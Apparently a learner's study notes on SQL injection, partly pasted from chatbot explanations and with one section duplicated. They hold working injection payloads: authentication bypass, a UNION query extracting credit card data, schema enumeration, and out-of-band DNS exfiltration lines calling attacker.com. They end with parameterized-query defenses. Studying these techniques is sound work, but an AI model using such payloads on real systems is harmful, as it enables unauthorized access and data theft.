SQL Injection:
A web application vulnerability that interferes with the queries an application makes to its database. By injecting malicious scripts into input fields or URLs, attackers can manipulate the database, access unauthorized data, or even modify or delete information

Normal Query (Expected Behavior):
A user inputs data (e.g., username and password).
The application uses this input to form a query:
SELECT * FROM users WHERE username = 'user123' AND password = 'pass123';
The database checks for a matching user and password.

SQL Injection (Exploited Behavior):
An attacker inputs malicious SQL code instead of normal input.
Example input for the username field:

' OR '1'='1


Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'pass123';


Since '1'='1' is always true, the attacker bypasses authentication.

Retrieving hidden data
Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
https://insecure-website.com/products?category=Gifts
This causes the application to make a SQL query to retrieve details of the relevant products from the database:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This SQL query asks the database to return:
all details (*)
from the products table
where the category is Gifts
and released is 1.
The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.

Using -- to bypass a password check is an example of SQL Injection, a vulnerability that occurs when user input is directly included in SQL queries without proper validation or escaping. Let me explain how you can use -- to manipulate a query to bypass the password check, step by step:

Understanding the Query Structure
Suppose the application performs a SQL query like this when you log in:

sql
Copy code
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
The username and password inputs are directly embedded in the query.
For login to succeed, the query must find a row in the users table where both conditions (username = 'wiener' and password = 'bluecheese') are true.
Injecting Malicious Input
Target the username field:

By including an SQL comment sequence (--), you can "terminate" the rest of the query.
Input the following in the username field:
vbnet
Copy code
administrator'--
Leave the password field blank or enter anything (it won't be checked).
Resulting Query: When the application processes your input, the query becomes:

sql
Copy code
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
How This Works:

The part of the query after -- is treated as a comment and ignored by the database.
The effective query becomes:
sql
Copy code
SELECT * FROM users WHERE username = 'administrator';
The password condition is removed from the query.
Outcome:

If the users table contains a row where username = 'administrator', the query will return that row.
The application assumes the login is successful because a valid user was found, even though the password wasn't verified.


Using -- to bypass a password check is an example of SQL Injection, a vulnerability that occurs when user input is directly included in SQL queries without proper validation or escaping. Let me explain how you can use -- to manipulate a query to bypass the password check, step by step:

Understanding the Query Structure
Suppose the application performs a SQL query like this when you log in:

sql
Copy code
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
The username and password inputs are directly embedded in the query.
For login to succeed, the query must find a row in the users table where both conditions (username = 'wiener' and password = 'bluecheese') are true.
Injecting Malicious Input
Target the username field:

By including an SQL comment sequence (--), you can "terminate" the rest of the query.
Input the following in the username field:
vbnet
Copy code
administrator'--
Leave the password field blank or enter anything (it won't be checked).
Resulting Query: When the application processes your input, the query becomes:

sql
Copy code
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
How This Works:

The part of the query after -- is treated as a comment and ignored by the database.
The effective query becomes:
sql
Copy code
SELECT * FROM users WHERE username = 'administrator';
The password condition is removed from the query.
Outcome:

If the users table contains a row where username = 'administrator', the query will return that row.
The application assumes the login is successful because a valid user was found, even though the password wasn't verified.
Step-by-Step Exploit
Here’s how you might execute this attack:

Input the following into the login form:

Username: administrator'--
Password: (leave blank or input anything)
Observe the Application's Behavior:

If the application doesn't properly validate inputs or escape special characters, it sends the modified query to the database.
The application logs you in as the administrator user, bypassing the password check.
Mitigating SQL Injection
To prevent this attack, web developers should:

Use parameterized queries (prepared statements): Ensure user input is treated as data, not executable code. Example (using Python and SQLite):
python
Copy code
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
Escape input properly: Sanitize input to escape characters like ', ", or --.
Validate input: Restrict inputs to expected formats (e.g., alphanumeric usernames).
Employ least privilege: Ensure the database user used by the app has minimal permissions.
By securing the application, such SQL Injection attacks can be avoided.



A SQL injection UNION attack takes advantage of the SQL UNION operator, which combines the results of two or more SELECT queries into a single result set. This technique allows an attacker to extract data from other tables in the database by appending additional queries to the original query.

Here’s a detailed explanation of how it works:

How UNION Works
The UNION keyword in SQL combines the results of multiple SELECT statements into a single result set. For example:

sql
Copy code
SELECT a, b FROM table1 
UNION 
SELECT c, d FROM table2;
This query:
Returns two columns of data: one from table1 (a and b) and one from table2 (c and d).
Both SELECT statements must return the same number of columns and compatible data types for the UNION to work.
How a SQL Injection UNION Attack Works
1. Initial Vulnerability:
Suppose the application uses the following query to retrieve user-specific data:
sql
Copy code
SELECT id, name FROM users WHERE username = 'wiener';
The application takes user input (e.g., the username wiener) and directly embeds it in the SQL query.
2. Attacker’s Input:
An attacker can inject a malicious payload, such as:
css
Copy code
' UNION SELECT credit_card_number, expiration_date FROM credit_cards--
This changes the original query to:
sql
Copy code
SELECT id, name FROM users WHERE username = '' UNION SELECT credit_card_number, expiration_date FROM credit_cards--';
3. What Happens:
The UNION operator appends the result of the second SELECT query (SELECT credit_card_number, expiration_date FROM credit_cards) to the result of the first query.
The application displays both the user data (if any) and the credit card details retrieved by the second query.
4. Outcome:
Sensitive data from the credit_cards table is leaked to the attacker via the application's response.


When you use a valid query like ORDER BY 1, the computer does not explicitly output anything unusual. Instead, the query executes successfully, and the result set is returned sorted by the specified column.

ORDER BY 1

Behavior of a Valid Query with ORDER BY 1
Execution without errors:
If the query is valid, the database successfully processes it and returns the results sorted by the first column of the result set.

Example Query:

sql
Copy code
SELECT id, username FROM users WHERE username = 'wiener' ORDER BY 1;
Column Index: 1 refers to the first column (id in this case).
The results are sorted in ascending order of the id column.
Application Output
The output depends on how the application is designed:

If results are displayed:
You’ll see the data sorted by the specified column (e.g., by id).

Example Output:

markdown
Copy code
id   | username
---------------
1    | alice
2    | bob
3    | charlie
If results are used internally:
The application might not display anything, but you won’t notice errors, indicating the query executed successfully.

If no rows match the WHERE clause:
The application might return a generic "No results found" message, but it still won't throw an error since the query syntax is valid.

Difference with an Invalid Query (e.g., ORDER BY 3 in a 2-column table)
If you use ORDER BY 3 on a result set that only has 2 columns, the database throws an error because it cannot sort by a non-existent third column.

Example error:

sql
Copy code
The ORDER BY position number 3 is out of range of the number of items in the select list.


Retrieving multiple values within a single column:

Essentially you can use a delimiter and || to concatenate different values into returning one string. 
Ex. Output:
anirudh~gopalan


You can list the contents of a database from most databases:
- Most databses have a set of views called a information schema to list the tables in the database
SELECT * FROM information_schema.tables

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

From there you can find specific information about the tables found

In this case there is the users table which you could use a query to find the columns and data types

SELECT * FROM information_schema.columns WHERE table_name = 'Users'

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar


BLIND SQL:
- attacker cannot directly see the results of their queries. 
Some ways attackers can still attack is by:
- validating how it responds to truth statements, etc: 1 = 1, 1 = 2
- Time based SQL Injection (verifying time delay functions)


Error Based SQL:
- Based on whether the program responds with an error according to the query, the attacker can determine whetehr the query succeded. 

CAST:
This technique leverages verbose SQL error messages to extract sensitive data from a database by intentionally causing type conversion errors.
By using functions like CAST() to convert data to an incompatible type, an attacker can often force the database to return the actual value it attempted to convert,
effectively making the data visible through the error message.


This scenario describes the use of time-based blind SQL injection, a technique that exploits SQL injection vulnerabilities by introducing time delays to infer information. Even when the application handles database errors gracefully and does not visibly reflect query results, the execution time of the query can serve as a signal for attackers to determine whether a condition is true or false.

How Time-Based Blind SQL Injection Works
SQL Queries Are Synchronous:

SQL queries are executed synchronously, meaning the application waits for the query to complete before responding to the user.
If a query introduces a delay (e.g., using SQL functions like SLEEP()), the application's HTTP response time also increases.
Injected Delays Reveal Information:

Attackers can inject conditions that cause delays only if the condition is true.
By measuring the time it takes for the application to respond, attackers can infer whether the condition is true or false.


When SQL attacks are processed asynchronously:
- the query is processed in a separate thread
- use Out of band interactions


Using DNS for OOB SQL Injection:

DNS is commonly used for OOB attacks because most production networks allow outgoing DNS queries.
Attackers use a domain they control (e.g., attacker.com) to capture DNS lookups triggered by the payload.
How It Works:

Inject a SQL payload that causes the database server to perform a DNS query to a domain controlled by the attacker.
For example:
sql
Copy code
' OR (SELECT LENGTH(database())) INTO OUTFILE '\\attacker.com\'--
The database server performs a DNS lookup for attacker.com to resolve the domain name.
The attacker monitors their DNS server and captures the request, confirming the payload was executed.

2. Conditional Data Exfiltration
Once the vulnerability is confirmed, you can exfiltrate data by embedding it in the domain name of the DNS request.

Example:
sql
Copy code
' OR IF(LENGTH(database())=6, LOAD_FILE('\\\\6.attacker.com\\'), LOAD_FILE('\\\\no6.attacker.com\\'))--
If the database name is 6 characters long, the server queries 6.attacker.com.
If not, it queries no6.attacker.com.
The attacker observes the DNS request and deduces whether the condition is true.


Second-Order SQL Injection
Occurs when:

User Input is Stored: The application saves user input (e.g., in a database) during one request.
Stored Input is Later Used Unsafely: The application retrieves and incorporates the stored input into a SQL query in another context, without proper sanitization.
The vulnerability does not manifest when the data is initially stored. Instead, it is triggered later when the data is retrieved and used unsafely.

How to prevent SQL injection
You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:

String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
You can rewrite this code in a way that prevents the user input from interfering with the query structure:

PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();


